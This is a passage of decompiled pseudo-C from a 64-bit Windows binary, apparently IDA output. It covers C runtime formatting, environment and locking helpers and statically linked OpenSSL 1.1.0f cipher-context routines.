        v15 = ((v14 - 88) & 0xFFDF) == 0 && (v11 & 0x20) != 0;
        if ( v15 || ((v14 - 65) & 0xFFDF) == 0 )
        {
          *((_WORD *)&v21 + v12++) = 48;
          v16 = v14 == 88 || v14 == 65;
          *((_WORD *)&v21 + v12) = v16 ? 88 : 120;
          LODWORD(v12) = v12 + 1;
        }
        v17 = *(_DWORD *)(v5 + 52) - *(_DWORD *)(v5 + 80) - v12;
        if ( (v11 & 0xC) == 0 )
        {
          LOBYTE(v11) = 32;
          __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<wchar_t>,char>(
            v5 + 1128,
            v11,
            v17,
            v5 + 40);
        }
        __crt_stdio_output::stream_output_adapter<wchar_t>::write_string(
          v5 + 1128,
          (unsigned int)&v21,
          v12,
          v5 + 40,
          *(_QWORD *)(v5 + 16));
        v19 = *(_DWORD *)(v5 + 48);
        if ( (v19 & 8) != 0 && (v19 & 4) == 0 )
        {
          LOBYTE(v18) = 48;
          __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<wchar_t>,char>(
            v5 + 1128,
            v18,
            v17,
            v5 + 40);
        }
        unknown_libname_22(v5, 0i64);
        if ( *(int *)(v5 + 40) >= 0 && (*(_DWORD *)(v5 + 48) & 4) != 0 )
        {
          LOBYTE(v20) = 32;
          __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<wchar_t>,char>(
            v5 + 1128,
            v20,
            v17,
            v5 + 40);
        }
        return 1;
      }
      v13 = 43;
    }
    LOWORD(v21) = v13;
    goto LABEL_46;
  }
  return 1;
}
// 140008B5A: variable 'v18' is possibly undefined
// 140008B86: variable 'v20' is possibly undefined
// 140006CF4: using guessed type __int64 __fastcall __crt_stdio_output::write_multiple_characters<__crt_stdio_output::stream_output_adapter<wchar_t>,char>(_QWORD, _QWORD, _QWORD, _QWORD);
// 140008F08: using guessed type __int64 unknown_libname_12(void);
// 1400091A4: using guessed type __int64 unknown_libname_14(void);
// 14000949C: using guessed type __int64 __fastcall unknown_libname_16(_QWORD, _QWORD);
// 1400096E4: using guessed type __int64 unknown_libname_17(void);
// 140009850: using guessed type __int64 unknown_libname_19(void);
// 140009B54: using guessed type __int64 __fastcall unknown_libname_22(_QWORD, _QWORD);
// 140009E28: using guessed type __int64 __fastcall __crt_stdio_output::stream_output_adapter<wchar_t>::write_string(_DWORD, _DWORD, _DWORD, _DWORD, __int64);

//----- (0000000140008BBC) ----------------------------------------------------
char __fastcall sub_140008BBC(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned int v4; // eax
  __int64 v5; // rbx
  char v6; // al
  unsigned int v7; // edx
  char v8; // r8
  int v9; // ecx
  __int64 v11; // rdx
  __int64 v12; // rdi
  __int16 v13; // ax
  __int16 v14; // cx
  bool v15; // r8
  bool v16; // al
  unsigned int v17; // esi
  __int64 v18; // rdx
  int v19; // ecx
  __int64 v20; // rdx
  int v21; // [rsp+30h] [rbp-38h] BYREF
  __int16 v22; // [rsp+34h] [rbp-34h]

  v4 = *(unsigned __int16 *)(a1 + 66);
  v5 = a1;
  if ( v4 > 0x64 )
  {
    if ( *(unsigned __int16 *)(a1 + 66) <= 0x67u )
      goto LABEL_34;
    if ( v4 != 105 )
    {
      switch ( v4 )
      {
        case 'n':
          v6 = unknown_libname_17();
          goto LABEL_35;
        case 'o':
          v9 = *(_DWORD *)(a1 + 48);
          if ( (v9 & 0x20) != 0 )
            *(_DWORD *)(v5 + 48) = v9 | 0x80;
          v7 = 8;
          a1 = v5;
          goto LABEL_32;
        case 'p':
          *(_DWORD *)(a1 + 56) = 16;
          *(_DWORD *)(a1 + 60) = 11;
LABEL_25:
          v8 = 1;
          v7 = 16;
LABEL_33:
          v6 = sub_140009544(a1, v7, v8, a4);
          goto LABEL_35;
        case 's':
LABEL_23:
          v6 = unknown_libname_19();
          goto LABEL_35;
      }
      if ( v4 != 117 )
      {
        if ( v4 != 120 )
          return 0;
        v7 = 16;
        goto LABEL_32;
      }
LABEL_31:
      v7 = 10;
LABEL_32:
      v8 = 0;
      goto LABEL_33;
    }
LABEL_30:
    *(_DWORD *)(a1 + 48) |= 0x10u;
    goto LABEL_31;
  }
  if ( v4 == 100 )
    goto LABEL_30;
  if ( v4 != 65 )
  {
    if ( v4 == 67 )
    {
LABEL_12:
      v6 = unknown_libname_16(a1, 0i64);
      goto LABEL_35;
    }
    if ( *(unsigned __int16 *)(a1 + 66) <= 0x44u )
      return 0;
    if ( *(unsigned __int16 *)(a1 + 66) > 0x47u )
    {
      if ( v4 != 83 )
      {
        if ( v4 != 88 )
        {
          if ( v4 == 90 )
          {
            v6 = unknown_libname_12();
            goto LABEL_35;
          }
          if ( v4 != 97 )
          {
            if ( v4 == 99 )
              goto LABEL_12;
            return 0;
          }
          goto LABEL_34;
        }
        goto LABEL_25;
      }
      goto LABEL_23;
    }
  }
LABEL_34:
  v6 = unknown_libname_14();
LABEL_35:
  if ( !v6 )
    return 0;
  if ( !*(_BYTE *)(v5 + 64) )
  {
    v11 = *(unsigned int *)(v5 + 48);
    v21 = 0;
    v12 = 0i64;
    v22 = 0;
    if ( (v11 & 0x10) == 0 )
      goto LABEL_47;
    if ( (v11 & 0x40) != 0 )
    {
      v13 = 45;
    }
    else
    {
      if ( (v11 & 1) == 0 )
      {
        if ( (v11 & 2) == 0 )
          goto LABEL_47;
        LOWORD(v21) = 32;
LABEL_46:
        v12 = 1i64;
LABEL_47:
        v14 = *(_WORD *)(v5 + 66);
        v15 = ((v14 - 88) & 0xFFDF) == 0 && (v11 & 0x20) != 0;
        if ( v15 || ((v14 - 65) & 0xFFDF) == 0 )
        {
          *((_WORD *)&v21 + v12++) = 48;
          v16 = v14 == 88 || v14 == 65;
          *((_WORD *)&v21 + v12) = v16 ? 88 : 120;
          LODWORD(v12) = v12 + 1;
        }
        v17 = *(_DWORD *)(v5 + 52) - *(_DWORD *)(v5 + 80) - v12;
        if ( (v11 & 0xC) == 0 )
        {
          LOBYTE(v11) = 32;
          __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(
            v5 + 1128,
            v11,
            v17,
            v5 + 40);
        }
        __crt_stdio_output::string_output_adapter<wchar_t>::write_string(
          v5 + 1128,
          (unsigned int)&v21,
          v12,
          v5 + 40,
          *(_QWORD *)(v5 + 16));
        v19 = *(_DWORD *)(v5 + 48);
        if ( (v19 & 8) != 0 && (v19 & 4) == 0 )
        {
          LOBYTE(v18) = 48;
          __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(
            v5 + 1128,
            v18,
            v17,
            v5 + 40);
        }
        unknown_libname_23(v5, 0i64);
        if ( *(int *)(v5 + 40) >= 0 && (*(_DWORD *)(v5 + 48) & 4) != 0 )
        {
          LOBYTE(v20) = 32;
          __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(
            v5 + 1128,
            v20,
            v17,
            v5 + 40);
        }
        return 1;
      }
      v13 = 43;
    }
    LOWORD(v21) = v13;
    goto LABEL_46;
  }
  return 1;
}
// 140008E26: variable 'v18' is possibly undefined
// 140008E52: variable 'v20' is possibly undefined
// 140006DE0: using guessed type __int64 __fastcall __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(_QWORD, _QWORD, _QWORD, _QWORD);
// 140008F08: using guessed type __int64 unknown_libname_12(void);
// 1400091A4: using guessed type __int64 unknown_libname_14(void);
// 14000949C: using guessed type __int64 __fastcall unknown_libname_16(_QWORD, _QWORD);
// 1400096E4: using guessed type __int64 unknown_libname_17(void);
// 140009850: using guessed type __int64 unknown_libname_19(void);
// 140009C40: using guessed type __int64 __fastcall unknown_libname_23(_QWORD, _QWORD);
// 140009FF0: using guessed type __int64 __fastcall __crt_stdio_output::string_output_adapter<wchar_t>::write_string(_DWORD, _DWORD, _DWORD, _DWORD, __int64);

//----- (0000000140009544) ----------------------------------------------------
char __fastcall sub_140009544(__int64 a1, unsigned int a2, char a3, __int64 a4)
{
  int v5; // ecx
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  __int64 v10; // rdx
  int v12; // ecx
  int v13; // ecx
  __int64 v14; // rcx
  int v15; // eax
  bool v16; // zf
  __int64 v17; // rax
  int v18; // eax
  __int64 v19; // rax
  int v20; // eax
  __int64 v21; // rax

  v5 = *(_DWORD *)(a1 + 60);
  LOBYTE(a4) = a3;
  if ( v5 > 5 )
  {
    v12 = v5 - 6;
    if ( !v12 )
      goto LABEL_8;
    v13 = v12 - 1;
    if ( !v13 )
      goto LABEL_8;
    v8 = v13 - 2;
    if ( !v8 )
      goto LABEL_8;
  }
  else
  {
    if ( v5 == 5 )
    {
LABEL_8:
      v10 = 8i64;
      goto LABEL_9;
    }
    if ( !v5 )
      goto LABEL_14;
    v7 = v5 - 1;
    if ( !v7 )
    {
      v10 = 1i64;
      goto LABEL_9;
    }
    v8 = v7 - 1;
    if ( !v8 )
    {
      v10 = 2i64;
      goto LABEL_9;
    }
  }
  v9 = v8 - 1;
  if ( !v9 )
  {
LABEL_14:
    v10 = 4i64;
    goto LABEL_9;
  }
  if ( v9 == 1 )
    goto LABEL_8;
  v10 = 0i64;
LABEL_9:
  switch ( v10 )
  {
    case 1i64:
      v20 = *(_DWORD *)(a1 + 48);
      *(_QWORD *)(a1 + 32) += 8i64;
      v16 = (v20 & 0x10) == 0;
      v21 = *(_QWORD *)(a1 + 32);
      if ( v16 )
        v14 = *(unsigned __int8 *)(v21 - 8);
      else
        v14 = *(char *)(v21 - 8);
      break;
    case 2i64:
      v18 = *(_DWORD *)(a1 + 48);
      *(_QWORD *)(a1 + 32) += 8i64;
      v16 = (v18 & 0x10) == 0;
      v19 = *(_QWORD *)(a1 + 32);
      if ( v16 )
        v14 = *(unsigned __int16 *)(v19 - 8);
      else
        v14 = *(__int16 *)(v19 - 8);
      break;
    case 4i64:
      v15 = *(_DWORD *)(a1 + 48);
      *(_QWORD *)(a1 + 32) += 8i64;
      v16 = (v15 & 0x10) == 0;
      v17 = *(_QWORD *)(a1 + 32);
      if ( v16 )
        v14 = *(unsigned int *)(v17 - 8);
      else
        v14 = *(int *)(v17 - 8);
      break;
    case 8i64:
      *(_QWORD *)(a1 + 32) += 8i64;
      v14 = *(_QWORD *)(*(_QWORD *)(a1 + 32) - 8i64);
      break;
    default:
      *errno() = 22;
      invalid_parameter_noinfo();
      return 0;
  }
  if ( (*(_DWORD *)(a1 + 48) & 0x10) != 0 && v14 < 0 )
  {
    v14 = -v14;
    *(_DWORD *)(a1 + 48) |= 0x40u;
  }
  if ( *(int *)(a1 + 56) >= 0 )
  {
    *(_DWORD *)(a1 + 48) &= ~8u;
    if ( *(int *)(a1 + 56) > 512 )
      *(_DWORD *)(a1 + 56) = 512;
  }
  else
  {
    *(_DWORD *)(a1 + 56) = 1;
  }
  if ( !v14 )
    *(_DWORD *)(a1 + 48) &= ~0x20u;
  if ( v10 == 8 )
    unknown_libname_4(a1, v14, a2, a4);
  else
    unknown_libname_3(a1, (unsigned int)v14, a2, a4);
  if ( (*(_DWORD *)(a1 + 48) & 0x80) != 0 && (!*(_DWORD *)(a1 + 80) || **(_BYTE **)(a1 + 72) != 48) )
  {
    *(_BYTE *)--*(_QWORD *)(a1 + 72) = 48;
    ++*(_DWORD *)(a1 + 80);
  }
  return 1;
}
// 140006B38: using guessed type __int64 __fastcall unknown_libname_3(_QWORD, _QWORD, _QWORD, _QWORD);
// 140006BD4: using guessed type __int64 __fastcall unknown_libname_4(_QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000014000A0B0) ----------------------------------------------------
__int64 __fastcall sub_14000A0B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v6; // [rsp+20h] [rbp-40h] BYREF
  __int64 v7; // [rsp+28h] [rbp-38h] BYREF
  __int64 v8; // [rsp+30h] [rbp-30h] BYREF
  __int64 v9[5]; // [rsp+38h] [rbp-28h] BYREF
  __int64 v10; // [rsp+70h] [rbp+10h] BYREF
  __int64 v11; // [rsp+78h] [rbp+18h] BYREF
  __int64 v12; // [rsp+80h] [rbp+20h] BYREF
  __int64 v13; // [rsp+88h] [rbp+28h] BYREF

  v6 = a5;
  v11 = a4;
  v13 = a3;
  v10 = a2;
  v12 = a1;
  if ( a2 && a3 )
  {
    v7 = a2;
    v9[0] = (__int64)&v10;
    v8 = a2;
    v9[1] = (__int64)&v11;
    v9[2] = (__int64)&v12;
    v9[3] = (__int64)&v13;
    v9[4] = (__int64)&v6;
    return ((__int64 (__fastcall *)(__int64 *, __int64 *, __int64 *, __int64 *, __int64))__crt_seh_guarded_call<int>::operator()<_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_,_lambda_9a20e10065b92b5193c3597a66cba9d4_ &,_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_>)(
             &a5,
             &v8,
             v9,
             &v7,
             v6);
  }
  else
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return 0xFFFFFFFFi64;
  }
}
// 1400069D8: using guessed type __int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_,_lambda_9a20e10065b92b5193c3597a66cba9d4_ &,_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_>(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000014000A13C) ----------------------------------------------------
__int64 __fastcall sub_14000A13C(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v6; // [rsp+20h] [rbp-40h] BYREF
  __int64 v7; // [rsp+28h] [rbp-38h] BYREF
  __int64 v8; // [rsp+30h] [rbp-30h] BYREF
  __int64 v9[5]; // [rsp+38h] [rbp-28h] BYREF
  __int64 v10; // [rsp+70h] [rbp+10h] BYREF
  __int64 v11; // [rsp+78h] [rbp+18h] BYREF
  __int64 v12; // [rsp+80h] [rbp+20h] BYREF
  __int64 v13; // [rsp+88h] [rbp+28h] BYREF

  v6 = a5;
  v11 = a4;
  v13 = a3;
  v10 = a2;
  v12 = a1;
  if ( a2 && a3 )
  {
    v7 = a2;
    v9[0] = (__int64)&v10;
    v8 = a2;
    v9[1] = (__int64)&v11;
    v9[2] = (__int64)&v12;
    v9[3] = (__int64)&v13;
    v9[4] = (__int64)&v6;
    return ((__int64 (__fastcall *)(__int64 *, __int64 *, __int64 *, __int64 *, __int64))__crt_seh_guarded_call<int>::operator()<_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_,_lambda_9a20e10065b92b5193c3597a66cba9d4_ &,_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_>)(
             &a5,
             &v8,
             v9,
             &v7,
             v6);
  }
  else
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return 0xFFFFFFFFi64;
  }
}
// 140006998: using guessed type __int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_,_lambda_9a20e10065b92b5193c3597a66cba9d4_ &,_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_>(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000014000B3C8) ----------------------------------------------------
__int64 __fastcall sub_14000B3C8(__int64 a1)
{
  char v2[24]; // [rsp+20h] [rbp-18h] BYREF

  unknown_libname_24(v2, a1, 0i64);
  return __crt_strtox::parse_integer<unsigned long,__crt_strtox::c_string_character_source<char>>(0i64);
}
// 14000A698: using guessed type __int64 __fastcall unknown_libname_24(_QWORD, _QWORD, _QWORD);
// 14000B3C8: using guessed type char var_18[24];

//----- (000000014000B584) ----------------------------------------------------
__int64 sub_14000B584()
{
  return (unsigned int)dword_14013FD40;
}
// 14013FD40: using guessed type int dword_14013FD40;

//----- (000000014000B58C) ----------------------------------------------------
void __fastcall sub_14000B58C(int a1)
{
  dword_14013FD40 = a1;
}
// 14013FD40: using guessed type int dword_14013FD40;

//----- (000000014000B5B4) ----------------------------------------------------
void __fastcall sub_14000B5B4(__int64 a1)
{
  qword_14013FD48 = a1;
}
// 14013FD48: using guessed type __int64 qword_14013FD48;

//----- (000000014000B99C) ----------------------------------------------------
void *sub_14000B99C()
{
  void *result; // rax
  int v1; // eax
  void *v2; // rcx

  result = qword_14013FF60;
  if ( !qword_14013FF60 )
  {
    if ( !qword_14013FF68 || (unsigned int)common_initialize_environment_nolock<char>() )
    {
      return 0i64;
    }
    else
    {
      v1 = initialize_environment_by_cloning_nolock<char>();
      v2 = qword_14013FF60;
      if ( v1 )
        return 0i64;
      return v2;
    }
  }
  return result;
}
// 14000BA2C: using guessed type __int64 common_initialize_environment_nolock<char>(void);
// 14000BD44: using guessed type __int64 initialize_environment_by_cloning_nolock<char>(void);

//----- (000000014000B9E4) ----------------------------------------------------
void *sub_14000B9E4()
{
  void *result; // rax
  int v1; // eax
  void *v2; // rcx

  result = qword_14013FF68;
  if ( !qword_14013FF68 )
  {
    if ( !qword_14013FF60 || (unsigned int)common_initialize_environment_nolock<wchar_t>() )
    {
      return 0i64;
    }
    else
    {
      v1 = initialize_environment_by_cloning_nolock<wchar_t>();
      v2 = qword_14013FF68;
      if ( v1 )
        return 0i64;
      return v2;
    }
  }
  return result;
}
// 14000BA98: using guessed type __int64 common_initialize_environment_nolock<wchar_t>(void);
// 14000BE18: using guessed type __int64 initialize_environment_by_cloning_nolock<wchar_t>(void);

//----- (000000014000BEC8) ----------------------------------------------------
__int64 __fastcall sub_14000BEC8(void **a1)
{
  void *v1; // rcx
  __int64 result; // rax

  v1 = *a1;
  if ( v1 != qword_14013FF78 )
    return unknown_libname_25(v1);
  return result;
}

//----- (000000014000BEE4) ----------------------------------------------------
__int64 __fastcall sub_14000BEE4(void **a1)
{
  void *v1; // rcx
  __int64 result; // rax

  v1 = *a1;
  if ( v1 != qword_14013FF70 )
    return unknown_libname_25(v1);
  return result;
}

//----- (000000014000C268) ----------------------------------------------------
void __fastcall sub_14000C268(__int64 a1)
{
  qword_14013FF88 = a1;
}
// 14013FF88: using guessed type __int64 qword_14013FF88;

//----- (000000014000C2EC) ----------------------------------------------------
__int64 __fastcall sub_14000C2EC(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_140140824;
    return 0i64;
  }
  else
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return 22i64;
  }
}
// 140140824: using guessed type int dword_140140824;

//----- (000000014000C55C) ----------------------------------------------------
int *sub_14000C55C()
{
  return &dword_14013FF94;
}
// 14013FF94: using guessed type int dword_14013FF94;

//----- (000000014000C564) ----------------------------------------------------
void **sub_14000C564()
{
  return &qword_14013FFA0;
}

//----- (000000014000C62C) ----------------------------------------------------
__int64 sub_14000C62C()
{
  return (unsigned int)dword_14013FFC4;
}
// 14013FFC4: using guessed type int dword_14013FFC4;

//----- (000000014000C660) ----------------------------------------------------
int *sub_14000C660()
{
  return &dword_14013FFC8;
}
// 14013FFC8: using guessed type int dword_14013FFC8;

//----- (000000014000CA20) ----------------------------------------------------
int __fastcall sub_14000CA20(_onexit_t Function)
{
  return register_onexit_function(&stru_14013FFD0, Function);
}

//----- (000000014000CB90) ----------------------------------------------------
__vcrt_bool sub_14000CB90()
{
  return _vcrt_uninitialize(0);
}

//----- (000000014000CE08) ----------------------------------------------------
void __fastcall sub_14000CE08(__int64 a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)(a1 + 48));
}

//----- (000000014000CE14) ----------------------------------------------------
void __fastcall sub_14000CE14(__int64 a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 48));
}

//----- (000000014000D35C) ----------------------------------------------------
void __fastcall sub_14000D35C(__int64 a1)
{
  qword_140140018 = a1;
}
// 140140018: using guessed type __int64 qword_140140018;

//----- (000000014000D528) ----------------------------------------------------
__int64 __fastcall sub_14000D528(int a1)
{
  int *v2; // [rsp+20h] [rbp-18h] BYREF
  int v3; // [rsp+40h] [rbp+8h] BYREF
  char v4; // [rsp+48h] [rbp+10h] BYREF
  int v5; // [rsp+50h] [rbp+18h] BYREF
  int v6; // [rsp+58h] [rbp+20h] BYREF

  v3 = a1;
  if ( a1 == -2 )
  {
    *_doserrno() = 0;
    *errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_140140420
      && (*(_BYTE *)(qword_140140020[(__int64)a1 >> 6] + ((unsigned __int64)(a1 & 0x3F) << 6) + 56) & 1) != 0 )
    {
      v5 = a1;
      v6 = a1;
      v2 = &v3;
      return ((__int64 (__fastcall *)(char *, int *, int **, int *))__crt_seh_guarded_call<int>::operator()<_lambda_bfedae4ebbf01fab1bb6dcc6a9e276e0_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_237c231691f317818eb88cc1d5d642d6_>)(
               &v4,
               &v6,
               &v2,
               &v5);
    }
    *_doserrno() = 0;
    *errno() = 9;
    invalid_parameter_noinfo();
  }
  return 0xFFFFFFFFi64;
}
// 14000D4B4: using guessed type __int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_bfedae4ebbf01fab1bb6dcc6a9e276e0_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_237c231691f317818eb88cc1d5d642d6_>(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 140140020: using guessed type __int64 qword_140140020[128];
// 140140420: using guessed type int dword_140140420;

//----- (00000001400107E8) ----------------------------------------------------
__int64 __fastcall sub_1400107E8(__int64 a1, __int64 *a2)
{
  __int64 result; // rax

  result = qword_140140438;
  if ( *a2 != qword_140140438 )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_140134A10) == 0 )
    {
      result = _acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}
// 140015304: using guessed type __int64 _acrt_update_thread_locale_data(void);
// 140134A10: using guessed type int dword_140134A10;
// 140140438: using guessed type __int64 qword_140140438;

//----- (000000014001081C) ----------------------------------------------------
__int64 __fastcall sub_14001081C(__int64 a1, __int64 *a2)
{
  __int64 result; // rax

  result = (__int64)Block;
  if ( (void *)*a2 != Block )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_140134A10) == 0 )
    {
      result = _acrt_update_thread_multibyte_data();
      *a2 = result;
    }
  }
  return result;
}
// 1400130FC: using guessed type __int64 _acrt_update_thread_multibyte_data(void);
// 140134A10: using guessed type int dword_140134A10;

//----- (0000000140013E18) ----------------------------------------------------
void __fastcall sub_140013E18(int a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)&unk_140140470 + a1);
}

//----- (0000000140013E6C) ----------------------------------------------------
void __fastcall sub_140013E6C(int a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)&unk_140140470 + a1);
}

//----- (00000001400147A0) ----------------------------------------------------
void __fastcall sub_1400147A0(int a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)(qword_140140020[(__int64)a1 >> 6] + ((unsigned __int64)(a1 & 0x3F) << 6)));
}
// 140140020: using guessed type __int64 qword_140140020[128];

//----- (0000000140014884) ----------------------------------------------------
void __fastcall sub_140014884(int a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(qword_140140020[(__int64)a1 >> 6] + ((unsigned __int64)(a1 & 0x3F) << 6)));
}
// 140140020: using guessed type __int64 qword_140140020[128];

//----- (0000000140015498) ----------------------------------------------------
char sub_140015498()
{
  hHeap = 0i64;
  return 1;
}

//----- (0000000140015588) ----------------------------------------------------
void __fastcall sub_140015588(__int64 a1)
{
  qword_140140838 = a1;
}
// 140140838: using guessed type __int64 qword_140140838;

//----- (00000001400197FC) ----------------------------------------------------
HANDLE sub_1400197FC()
{
  HANDLE result; // rax

  result = CreateFileW(L"CONOUT$", 0x40000000u, 3u, 0i64, 3u, 0, 0i64);
  hObject = result;
  return result;
}

//----- (0000000140019838) ----------------------------------------------------
int sub_140019838()
{
  int result; // eax

  result = (_DWORD)hObject + 2;
  if ( (unsigned __int64)hObject + 2 > 1 )
    return CloseHandle(hObject);
  return result;
}

//----- (000000014001B2F0) ----------------------------------------------------
__int64 __fastcall sub_14001B2F0(_OWORD *a1, __int64 a2)
{
  __int64 v4; // rcx
  size_t v5; // rcx
  void *v6; // rax

  if ( !a2 || !*(_QWORD *)a2 )
  {
    sub_140024610(6, 163, 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 610);
    return 0i64;
  }
  v4 = *(_QWORD *)(a2 + 8);
  if ( !v4 || (unsigned int)sub_140025980(v4) )
  {
    sub_14001B600((__int64)a1);
    *a1 = *(_OWORD *)a2;
    a1[1] = *(_OWORD *)(a2 + 16);
    a1[2] = *(_OWORD *)(a2 + 32);
    a1[3] = *(_OWORD *)(a2 + 48);
    a1[4] = *(_OWORD *)(a2 + 64);
    a1[5] = *(_OWORD *)(a2 + 80);
    a1[6] = *(_OWORD *)(a2 + 96);
    a1[7] = *(_OWORD *)(a2 + 112);
    a1[8] = *(_OWORD *)(a2 + 128);
    a1[9] = *(_OWORD *)(a2 + 144);
    if ( *(_QWORD *)(a2 + 112) )
    {
      v5 = *(int *)(*(_QWORD *)a2 + 48i64);
      if ( (_DWORD)v5 )
      {
        v6 = sub_14001D8E0(v5);
        *((_QWORD *)a1 + 14) = v6;
        if ( !v6 )
        {
          *(_QWORD *)a1 = 0i64;
          sub_140024610(6, 163, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 628);
          return 0i64;
        }
        memmove(v6, *(const void **)(a2 + 112), *(int *)(*(_QWORD *)a2 + 48i64));
      }
    }
    if ( (*(_DWORD *)(*(_QWORD *)a2 + 16i64) & 0x400) == 0
      || (*(unsigned int (__fastcall **)(__int64, __int64, _QWORD, _OWORD *))(*(_QWORD *)a2 + 72i64))(
           a2,
           8i64,
           0i64,
           a1) )
    {
      return 1i64;
    }
    *(_QWORD *)a1 = 0i64;
    sub_140024610(6, 163, 134, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 637);
  }
  else
  {
    sub_140024610(6, 163, 38, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 616);
  }
  return 0i64;
}

//----- (000000014001B470) ----------------------------------------------------
__int64 __fastcall sub_14001B470(__int64 a1)
{
  __int64 (*v1)(void); // rax
  __int64 result; // rax

  if ( *(_QWORD *)a1 )
  {
    v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 72i64);
    if ( v1 )
    {
      result = v1();
      if ( (_DWORD)result != -1 )
        return result;
      sub_140024610(6, 124, 133, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 592);
    }
    else
    {
      sub_140024610(6, 124, 132, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 585);
    }
  }
  else
  {
    sub_140024610(6, 124, 131, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 580);
  }
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014001B4E0) ----------------------------------------------------
void __fastcall sub_14001B4E0(void *a1)
{
  sub_14001B600((__int64)a1);
  sub_14001D930(a1);
}

//----- (000000014001B520) ----------------------------------------------------
void *__fastcall sub_14001B520()
{
  int v0; // eax

  return sub_14001DC20((unsigned int)(v0 + 120));
}
// 14001B538: variable 'v0' is possibly undefined

//----- (000000014001B550) ----------------------------------------------------
__int64 __fastcall sub_14001B550(unsigned int *a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 (__fastcall *v3)(unsigned int *, __int64, _QWORD, __int64); // r10
  unsigned int v4; // ecx

  v2 = *(_QWORD *)a1;
  if ( (*(_DWORD *)(*(_QWORD *)a1 + 16i64) & 0x200) != 0 )
  {
    if ( !v2 )
    {
      sub_140024610(6, 124, 131, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 580);
      return 0i64;
    }
    v3 = *(__int64 (__fastcall **)(unsigned int *, __int64, _QWORD, __int64))(v2 + 72);
    if ( !v3 )
    {
      sub_140024610(6, 124, 132, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 585);
      return 0i64;
    }
    v4 = v3(a1, 6i64, 0i64, a2);
    if ( v4 == -1 )
    {
      sub_140024610(6, 124, 133, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_enc.c", 592);
      return 0i64;
    }
  }
  else
  {
    return (int)sub_140025460(a2, a1[26]) > 0;
  }
  return v4;
}

//----- (000000014001B600) ----------------------------------------------------
__int64 __fastcall sub_14001B600(__int64 a1)
{
  __int64 (*v2)(void); // rdx
  __int64 result; // rax
  __int64 v4; // rcx
  __int64 v5; // rdx

  if ( !a1 )
    return 1i64;
  if ( !*(_QWORD *)a1 )
  {
LABEL_8:
    sub_14001D930(*(void **)(a1 + 112));
    sub_140025890(*(_QWORD *)(a1 + 8));
    memset((void *)a1, 0, 0xA0ui64);
    return 1i64;
  }
  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 40i64);
  if ( !v2 || (result = v2(), (_DWORD)result) )
  {
    v4 = *(_QWORD *)(a1 + 112);
    if ( v4 )
    {
      v5 = *(int *)(*(_QWORD *)a1 + 48i64);
      if ( (_DWORD)v5 )
        sub_140023440(v4, v5);
    }
    goto LABEL_8;
  }
  return result;
}

//----- (000000014001B690) ----------------------------------------------------
__int64 __fastcall sub_14001B690(_DWORD *a1, int a2)
{
